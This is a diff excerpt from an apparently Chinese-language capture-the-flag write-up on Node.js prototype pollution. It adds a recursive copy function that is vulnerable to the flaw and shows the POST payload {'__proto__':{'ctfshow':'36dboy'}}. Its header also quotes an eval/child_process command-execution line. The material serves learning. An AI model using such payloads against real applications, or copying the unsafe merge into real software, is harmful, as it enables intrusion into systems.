@@ -81,9 +81,20 @@ eval(require("child_process").execSync('ls'))
 那么secert.ctfshow值也存在为36dboy。
 
 又每一个对象都有__proto__属性，通过secert.__proto__可以修改父类的Object.prototype，结合copy函数和json最终修改Object类prototype，定义了一个ctfshow值为36dboy
+
+function copy(object1, object2){
+    for (let key in object2) {
+        if (key in object2 && key in object1) {
+            copy(object1[key], object2[key])
+        } else {
+            object1[key] = object2[key]
+        }
+    }
+  }
 ```
 于是POST传递请求体
 ```
+
 {"__proto__":{"ctfshow":"36dboy"}}
 ```
 
